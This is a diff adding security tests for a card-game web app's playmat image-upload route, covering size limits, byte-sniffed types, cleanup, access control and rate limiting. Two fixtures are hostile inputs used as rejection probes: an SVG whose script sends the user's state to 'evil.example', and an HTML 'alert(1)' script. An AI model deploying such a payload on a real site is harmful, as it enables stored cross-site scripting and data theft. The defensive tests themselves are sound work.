@@ -18,6 +18,10 @@ process.env.DATA_FILE      = path.join(tmpDir, 'state.json');
 process.env.ADMIN_PASSWORD = 'testpass';
 process.env.PORT           = '0'; // random port
 process.env.AUTH_RATE_LIMIT_MAX = '1000'; // don't trip the login limiter in tests
+// Low enough that one test can reach it in a few requests. The limiter is
+// reset between tests (see the playmat suite), so a small ceiling costs the
+// rest of the suite nothing.
+process.env.UPLOAD_RATE_LIMIT_MAX = '4';
 // No bulk download, no set-index sweep: the suite asserts nothing about
 // either, and both would reach out to Scryfall on every run.
 process.env.MTGTOOLS_NO_BACKGROUND = '1';
@@ -706,6 +710,214 @@ describe('User preferences: /api/prefs', () => {
     assert.equal(create.status, 200);
     const cookie = await loginAs('alice', 'apw2');
     assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.theme, 'dark');
+  });
+});
+
+// ── Playmat uploads ───────────────────────────────────────────────────────────
+// The one route that turns a request body into a file this application later
+// serves back on its own origin, so what is asserted is mostly what does *not*
+// happen: nothing lands on disk that is not a raster image, nothing outlives
+// the preference that points at it, and nobody reads anybody else's.
+describe('Playmat uploads: /api/prefs/playmat', () => {
+  const bcrypt   = require('bcryptjs');
+  const playmats = require('../playmat-store');
+  const { uploadLimiter } = require('../middleware/limits');
+
+  // Real files, small enough to inline. Only their leading bytes matter to
+  // the server, but using genuine images keeps the fixtures honest about what
+  // is being accepted.
+  const b64 = s => Buffer.from(s, 'base64');
+  const PNG  = b64('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==');
+  const WEBP = b64('UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=');
+  const JPEG = b64('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==');
+  const SVG  = Buffer.from(
+    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">' +
+    '<script>fetch("/api/state").then(r=>r.text()).then(t=>fetch("//evil.example/"+t))</script></svg>');
+
+  function addUser(username, password) {
+    dbModule.db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)')
+      .run(username, bcrypt.hashSync(password, 10), 'player');
+  }
+
+  // Upload as raw bytes with a declared content type. The type is deliberately
+  // a parameter of the helper: several tests below are about it being ignored.
+  function upload(cookie, bytes, contentType = 'application/octet-stream') {
+    return request.post('/api/prefs/playmat')
+      .set('Cookie', cookie)
+      .set('Content-Type', contentType)
+      .send(bytes);
+  }
+
+  // Everything in the playmat directory, so a test can assert an absence
+  // without knowing how a filename is derived.
+  function filesOnDisk() {
+    try { return fs.readdirSync(playmats.dir).sort(); } catch { return []; }
+  }
+
+  beforeEach(() => {
+    resetDb();
+    addUser('alice', 'apw');
+    addUser('bob',   'bpw');
+    fs.rmSync(playmats.dir, { recursive: true, force: true });
+    // The limiter counts by IP and every test here shares one, so its budget
+    // has to be given back or the suite's own order would decide who is
+    // throttled. The rate-limit test below is the only one that spends it.
+    uploadLimiter.resetKey('::ffff:127.0.0.1');
+    uploadLimiter.resetKey('127.0.0.1');
+    uploadLimiter.resetKey('::1');
+  });
+
+  after(() => { fs.rmSync(playmats.dir, { recursive: true, force: true }); });
+
+  test('a valid image is stored, recorded, and served back', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    const res    = await upload(cookie, PNG, 'image/png');
+    assert.equal(res.status, 200);
+    assert.equal(res.body.playmatKind, 'upload');
+    assert.equal(res.body.stored, true);
+    assert.match(res.body.playmatUrl, /^\/playmat\/alice\?v=\d+$/);
+    assert.equal(filesOnDisk().length, 1);
+
+    // It survives the request that set it: a new session reads the same mat.
+    const later = await request.get('/api/prefs').set('Cookie', await loginAs('alice', 'apw'));
+    assert.equal(later.body.playmatUrl, res.body.playmatUrl);
+
+    const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
+    assert.equal(img.status, 200);
+    assert.equal(img.headers['content-type'], 'image/png');
+    assert.ok(Buffer.from(img.body).equals(PNG), 'the bytes served are the bytes uploaded');
+  });
+
+  test('JPEG and WebP are accepted too, and served as what they are', async () => {
+    for (const [bytes, type] of [[JPEG, 'image/jpeg'], [WEBP, 'image/webp']]) {
+      const cookie = await loginAs('alice', 'apw');
+      const res    = await upload(cookie, bytes, type);
+      assert.equal(res.status, 200, `${type} should be accepted`);
+      const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
+      assert.equal(img.headers['content-type'], type);
+    }
+  });
+
+  test('an oversized file is rejected, and nothing is written', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    // A real PNG header followed by six megabytes of it: the size check has to
+    // come first, or this would be accepted as the image it claims to be.
+    const huge = Buffer.concat([PNG, Buffer.alloc(6 * 1024 * 1024, 0x41)]);
+    const res  = await upload(cookie, huge, 'image/png');
+    assert.equal(res.status, 413);
+    assert.match(res.body.error, /too large/i);
+    assert.deepEqual(filesOnDisk(), [], 'nothing reaches disk before the size is known');
+    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.playmatKind, 'none');
+  });
+
+  test('a vector image is rejected, whatever it calls itself', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    for (const type of ['image/svg+xml', 'image/png', 'image/jpeg']) {
+      const res = await upload(cookie, SVG, type);
+      assert.equal(res.status, 415, `an SVG declared as ${type} is still an SVG`);
+      assert.match(res.body.error, /SVG/);
+    }
+    assert.deepEqual(filesOnDisk(), []);
+  });
+
+  test('the declared type is never what decides — the bytes are', async () => {
+    const cookie = await loginAs('alice', 'apw');
+
+    // Bytes that are not an image, wearing an accepted content type.
+    const notAnImage = Buffer.from('<!doctype html><script>alert(1)</script>');
+    assert.equal((await upload(cookie, notAnImage, 'image/png')).status, 415);
+    assert.deepEqual(filesOnDisk(), []);
+
+    // And the same indifference the other way: a real PNG that lies about
+    // itself is stored, and stored as the PNG it actually is.
+    const res = await upload(cookie, PNG, 'image/svg+xml');
+    assert.equal(res.status, 200);
+    const img = await request.get(res.body.playmatUrl).set('Cookie', cookie);
+    assert.equal(img.headers['content-type'], 'image/png');
+  });
+
+  test('a second upload replaces the first, and the old file is gone', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    const first  = await upload(cookie, PNG, 'image/png');
+    const before = filesOnDisk();
+    assert.equal(before.length, 1);
+
+    // A different format, so a replacement that only overwrote the same
+    // filename would leave the first one behind.
+    const second = await upload(cookie, JPEG, 'image/jpeg');
+    assert.equal(second.status, 200);
+    const after = filesOnDisk();
+    assert.equal(after.length, 1, 'one playmat per person, on disk as well as in the row');
+    assert.notDeepEqual(after, before);
+    assert.notEqual(second.body.playmatUrl, first.body.playmatUrl,
+      'the URL carries a version, so the replacement is not hidden behind a cached first');
+    assert.equal((await request.get(first.body.playmatUrl).set('Cookie', cookie))
+      .headers['content-type'], 'image/jpeg');
+  });
+
+  test('deleting the playmat removes both the preference and the file', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    await upload(cookie, PNG, 'image/png');
+
+    const del = await request.delete('/api/prefs/playmat').set('Cookie', cookie);
+    assert.equal(del.status, 200);
+    assert.equal(del.body.playmatKind, 'none');
+    assert.equal(del.body.playmatUrl, null);
+    assert.deepEqual(filesOnDisk(), []);
+    assert.equal((await request.get('/api/prefs').set('Cookie', cookie)).body.playmatKind, 'none');
+  });
+
+  test('switching to a card playmat also takes the uploaded file with it', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    await upload(cookie, PNG, 'image/png');
+    const res = await request.put('/api/prefs').set('Cookie', cookie).send({
+      playmatKind: 'scryfall', playmatRef: 'Underground Sea',
+      playmatUrl: 'https://cards.scryfall.io/art_crop/front/x.jpg',
+    });
+    assert.equal(res.status, 200);
+    assert.deepEqual(filesOnDisk(), [], 'the file a preference no longer points at is storage nobody can reach');
+  });
+
+  test('a client cannot claim an upload it never made', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    const res = await request.put('/api/prefs').set('Cookie', cookie)
+      .send({ playmatKind: 'upload', playmatUrl: '/playmat/bob' });
+    assert.equal(res.status, 400);
+  });
+
+  test('deleting a user removes their playmat file', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    await upload(cookie, PNG, 'image/png');
+    assert.equal(filesOnDisk().length, 1);
+
+    const adminCookie = await loginAs('admin', process.env.ADMIN_PASSWORD);
+    assert.equal((await request.delete('/api/admin/users/alice').set('Cookie', adminCookie)).status, 200);
+    assert.deepEqual(filesOnDisk(), [], 'deleting an account leaves nothing of the account behind');
+  });
+
+  test('the serving route requires authentication, and serves only your own', async () => {
+    const aliceCookie = await loginAs('alice', 'apw');
+    const { playmatUrl } = (await upload(aliceCookie, PNG, 'image/png')).body;
+
+    // No session at all: 401, and not a redirect to the login page — a login
+    // page returned in place of an image is a broken background.
+    const anon = await request.get(playmatUrl);
+    assert.equal(anon.status, 401);
+
+    // A session, but somebody else's.
+    const bobCookie = await loginAs('bob', 'bpw');
+    assert.equal((await request.get(playmatUrl).set('Cookie', bobCookie)).status, 403);
+    // And bob asking for his own, which does not exist, learns nothing about alice's.
+    assert.equal((await request.get('/playmat/bob').set('Cookie', bobCookie)).status, 404);
+  });
+
+  test('the upload route is rate-limited', async () => {
+    const cookie = await loginAs('alice', 'apw');
+    const max    = Number(process.env.UPLOAD_RATE_LIMIT_MAX);
+    for (let i = 0; i < max; i++) assert.equal((await upload(cookie, PNG, 'image/png')).status, 200);
+    const over = await upload(cookie, PNG, 'image/png');
+    assert.equal(over.status, 429);
+    assert.match(over.body.error, /Too many/i);
   });
 });
 
